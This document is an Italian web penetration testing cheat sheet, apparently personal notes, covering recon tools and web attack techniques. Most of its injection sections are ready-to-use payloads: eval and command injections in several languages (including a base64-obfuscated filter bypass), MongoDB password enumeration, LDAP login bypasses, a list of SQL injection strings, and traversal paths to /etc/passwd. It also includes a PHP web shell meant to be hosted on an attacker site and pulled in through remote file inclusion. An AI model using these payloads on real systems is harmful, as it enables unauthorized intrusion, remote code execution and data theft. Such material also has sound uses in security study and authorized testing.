## Python tips

Il modulo  **[http.client](https://docs.python.org/3/library/http.client.html)** non codifica automaticamente le url ed è quindi possibile passare url con codifica personalizzata. Ad esempio se caratteri speciali come `^` non devono essere codificati, per regex. 
  
```python
import http.client
conn = http.client.HTTPConnection("127.0.0.1", 8080)
conn.set_tunnel("remote-website")
url = "xxxx"
conn.request("GET", url)
r = conn.getresponse()
r.read()
```  

## Ruby on Rails

Concetto fondamentale di Ruby on Rails è **convention over configuration** il che significa che molto del codice delle web app è dinamicamente generato dal framework.  

Questo significa anche che molte configurazioni sono "standard" e comuni a molte applicazioni web, come comuni possono essere problemi di sicurezza derivanti appunto dalla "standardizzazione" dello sviluppo dele app, ad esempio versioni in formato .json di pagine web pubblicamente accessibli.

## Code execution

Esempio, l'input dell'utente è passato all'interno della funzione `eval()`. La pericolosità di questo tipo di funzioni risiede nel fatto che la stringa che ricevono come argomento viene trattata ed eseguita come uno script.  

In alcuni linguaggi, più diffusamente in versioni legacy, operazioni di ricerca e sostituzione di testo (e regex) eseguono l'equivalente di funzioni `eval()` sull'argomento passato come nuovo carattere/stringa.

L'inserimento di caratteri inaspettati come input può causare comportamenti imprevisti nell'applicazione come la restituzione al client di messaggi di errore.  
I **warnings** dovuti a errori nel codice non interrompono l'eecuzione dello stesso, non compromettendo quindi l'exploit della vulnerabilità.

Framework moderni per la costruzioni di pagine web/applicazioni web generano url che accettano input utente strutturate come **www.esempio.com/funzione/argomento.**  
Invece di `/hello?name=hacker` o `/hello?hacker` o `/hello=hacker` ma semplicemente `/hello/hacker`.

Per testare injection point, usare `"` e `'`.

## Command execution

Alcune command executions non restituiscono output. Se non compaiono nemmeno errori significa che l'esecuzione ha avuto successo.  
È possibile testare questi casi di blind command execution usando comandi come `sleep` o `ping` e `curl` per contattare risorse esterne controllate.

## Directory traversal

In Windows è possibile accedere ai file anteponendo una directory anche inestistente per accedere a una risorsa in un'altra cartella, esempio **test/../../../file.txt**. 

In Linux invece se la cartella non esiste viene generato un errore.

## LFI & RFI

Esempio di url vulnerabile: `/?page=intro.php`.

Aggiungere un apice singolo o qualsiasi altro carattere a _intro.php_ può causare l'applicazione a generare un output di errore che contiene però informazioni utili.  

Nel caso in cui la funzione `include()` (o simili in scopo e funzionamento) sia citata nel messaggio di errore diventa utile approfondire in quanto l'inclusione di input utente porta a **Local File Inclusion**, **Remote File Inclusion** and **Directory Traversal**.
 
## LDAP

In alcuni casi, server che fanno uso di LDAP accettano richieste POST (sign-in) senza argomenti. Quando il server riceve valori NULL, LDAP procede a una connessione bind.  
Il codice interpreta la connessione come credenziali valide.  

**Bind** = connect.  
**Search** = query.  

Connessioni bind NULL (username=NULL, password=NULL) non sempre funzionano.  
Il valore NULL si ottiene **eliminando** i valori dalla richiesta, non inviandoli vuoti.

Per aggiungere condizioni e logica boolean a stringhe LDAP:

- boolean OR `|` `(|(cn=[INPUT1])(cn=[INPUT2]))` per ottenere record che fanno match con  [INPUT1] o [INPUT2]`.
- boolean AND `&` `(&(cn=[INPUT1])(userPassword=[INPUT2]))` per ottenere record per cui cn faccia match con [INPUT1] e la password che faccia match con [INPUT2].

LDAP usa il simbolo `*` come wildcard molto spesso (corrisponde a `SELECT * FROM`).  
Nel caso di injection, si può sfruttare questa wildcard per cercare match con stringhe intere o substring (`adm*`).

**LDAP supporta diversi formati: {CLEARTEXT}, {MD5}, {SMD5} (salted MD5), {SHA}, {SSHA} (salted SHA1), {CRYPT} per memorizzare le password**

## Important CVEs

**php**
- CVE-2008-4096 (phpMyAdmin)


# Recon

- **bgp.he.net**: informazioni su blocchi IP/domini.  
    `Inserire nome dell'organizzazione/azienda/target nel campo search, dopodiché cercare indirizzi IP o ASN direttamente correlati con il target.`  
    `Alcuni risultati contengono più dettagli di altri, in questi in particolare prestare attenzione ai PrefixesV4`.
- **ARIN** o altri "Whois" relativi all'area geografica di appartenenza (RIPE, APNIC...)
- **Crunchbase**: l'account gratuito ha un limite mensile alla ricerca nel database.  
    Le acquisizioni sono importanti in quanto l'infrastruttua IT dell'azienda acquisita entra a far parte degli asset del target (quindi blocchi IP, domini, server...).  
    L'infrastruttura acquisita potrebbe non essere rafforzata e rimane quindi esposta a vulnerabilità.  
    Più il target è una azienda "grande" più potrebbero essere le acquisizioni operate da prendere in considerazione.
- **occrpaleph**: motore di ricerca per reporte. File di principale interesse sono quelli legati alla sicurezza come i **US Sec (CortpWatch)**
- **BuiltWith**: website + estensione di Google Chrome. Come **Wappalyzer** riporta le tecnologie usate per costruire l'applicazione web.  
BuiltWith può identificare anche i servizi in uso in background come Google Analytics.  
La sezione **Relationship** mostra l'elenco di altri siti in cui sono state osservate le stesse tecnologie in uso. Ad esempio il codice privato di Google Analytics può essere usato per trovare altri domini.
- **Shodan**: motore di ricerca per enumerazione passiva del target.
- **Karma v2**: utilizza token API a pagamento di Shodan per individuare domini nascosti, indirizzi IP e le relative porte aperte.
- **Amass**: enumerazione passiva e attiva di sottodimini. Utilizza API di diversi servizi per massimizzare la ricerca delle informazioni richieste. Maggiori sono i dettagli forniti al tool come domains, IPs or IP blocks, ASNs più è approfondita la ricerca.

# Tools for Out-of-band connections

- **https://webhook.site/**

# Authentication

- **Registrazione account**
    - **controllare i cookie** per credenziali codificate o criptate (potrebbe aiutare individuare prima le tecnologie in uso)
    - **registrare un account** usando informazioni di un account esistende o leggermente differente in quanto le operazioni del database in backend potrebbero essere case-insensitive:
        - cambiare lettere maiuscoole/minuscol, es. Admin invece di admin
        - aggiungere uno o più spazi bianchi alla fine dello username, es "admin "
- **Redirect non gestito**
    - **controllare codice HTTP 302** perché alcune risorse potrebbero comparire in messaggi di redirect in quanto l'applicazione web non smette l'esecuzione della richiesta. Tool di proxy potrebbero catturare pagine di redirect, con codice 302, che contengono informazioni utili ma che non sono visibili utilizzando il browser.
- **Bypass funzione di login**
    - LDAP: blind NULL inviando una richiesta POST **priva** di argomenti
    - LDAP: `GET /?name=admin*))%00&password=whatever` >> `(&(cn=admin*))%00))%00(password=whatever))`

# Authorization

- **Insecure Direct Object Reference**
    - **controllare valori facilemnte prevedibili** in URLs, ex. /infos/1, /infos/2, /infos/3 ...
- **Modificare Content-type per le risposte** (accesso a informazioni private)
    - **cambiare l'header Accept** nelle richieste per ottenere informazioni in formati diversi da quanto stabilito dallo sviluppatore. Es, `application/json` invece di `text/html, application/xhtml+xml`.
    - **aggiungere estensione a valore/id** per accedere a informazioni in formati differenti (se supportato). Es. /user/1.json (invece di /user/1(.html)).
- **Cambiare il livello di privilege dell'utente (live)** nelle richiese come la registrazione o update di informazioni biografiche. Es. user%5Busername%5D=test3&user%5Bpassword%5D=test`&user%5Badmin%5D=true (OR 1)`&submit=Submit.

# Injection

- ### Code execution/injection
    - **commentare** e inserire il nuovo codice
        - PHP: `//`
        - SQL: `/* */`
        - MySQL: `-- `
        - Some SQL: `#`
        - MongoDB: `%00`,`//`, `<!--`
    - NoSQL:
        - MongoDB:
            - `username=admin' || 1==1 %00&password=whatever&submit=Submit`
            - `username' && this.password%00` (determina se il campo password esiste)
            - `username' && this.password && this.password.match(/.*/)%00` (determina se la password esiste e corrisponde al wildcard)
            - - `username' && this.password && this.password.match(/^[char].*$/)%00` (enumerazione della password)
    - **concatenazione** al fine di inserire codice:
        - Ruby: `+` >> ``"+`[COMMAND]`+"``
        - PHP: `. +` >> `/?name=".system('id');//"`
        - Python: `+` >> `/hello/hacker"+str(os.popen('id').read())+"`
            - (importare il modulo) >> `/hello/hacker"+str(__import__('os').popen('id').read())+"` 
            - (`/` blacklisted) >> `/hello/hacker"+str((__import__('os').popen(__import__('base64').b64decode('[BASE64 ENCODED COMMAND]').decode())).read())+"`
        - Perl: `.` >> ``/cgi-bin/hello?name=hacker'.`id`.'a``
    - **ordinamento** exploit:
        - PHP:
            - `/?order=id);}system('whoami');//` - [CVE-2008-4096]
    - **regex cerca/sostituisci**:
        - PHP
            - `/?new=system('id')&pattern=/replacement/e&base=Hello%20user` (paramentro /e, PHP valuta argomento prima della sostituzione)      
    - **funzioni legacy**
        - PHP
            - _[assert()](https://www.php.net/manual/en/function.assert.php)_: `/?name=hacker'.system('id').'`
- ### Command Execution  
    - Linux:
        - `command1 && command2 that will run command2 if command1 succeeds.`  
        `command1 || command2 that will run command2 if command1 fails.`  
        `command1 ; command2 that will run command1 then command2.`  
        `command1 | command2 that will run command1 and send the output of command1 to command2.`  
        `$(injected command)`  
        `` \`injected command\` ``

- ### SQL Injection
    MySql: 
    ```
    ' OR 1=1 -- 
    ' OR '1'='1
    ' OR '1'='1' -- 
    ') OR 1=1 -- 
    " OR 1=1 -- 
    " OR "1"="1
    " OR "1"="1" -- 
    ") OR 1=1 -- 
    ' OR 1=1 LIMIT 1 -- 
     OR '1'='1' LIMIT 1 -- 
    ') OR 1=1 LIMIT 1 -- 
    ') OR '1'='1' LIMIT 1 -- 
    ')OR('1'='1    
    ')||1#
    '||1#
    ')OR(1=1)#
    '||1=1#- 
    'OR(1=1)#
    ')OR('1'='1
    '%09OR%091=1%09--%09 (%09 corrisponde al TAB, sostituisce gli spazi quando questi sono bloccati)
    ```

# Directory traversal

`/file.php?file=file.php`  
`/file.php?file=file.php%00`

`/file.php?file=/hacker.png/../../../../../../../../../../../etc/passwd`  
`/file.php?file=/var/www(!removed >> hacker.png!)/../../../../../../../../../../../etc/passwd`  
`/file.php?file=../../../../../../../../../../../etc/passwd%00`

# LFI & RFI

**remotefile.txt** : 
```php
<?php 
  system($_GET['c']);
?>
___

<?php 

phpinfo();

?>
```
**file php con funzione include()** :
```
http://<website>/?page=intro.php

>>

/?c=[COMMAND]&page=https://<hackersite>/remotefile.txt 

OR

/?page=https://<hackersite>/remotefile.txt&c=[COMMAND] 
```
**NULL BYTE**
```
http://<website>/?page=intro.php

>>

/?c=[COMMAND]&page=https://<hackersite>/remotefile.txt%00 

OR

/?page=https://<hackersite>/remotefile.txt%00&c=[COMMAND]
```

# Open Redirect

Quando un redirect è forzato a iniziare con `/`, l'aggiunta del sito web al redirect anteponendo una seconda `/`, supera il controllo.  
// sono interpretate come alias per http:// or https://.

`/redirect.php?url=//www.test.test` == GET / - Host: www.test.test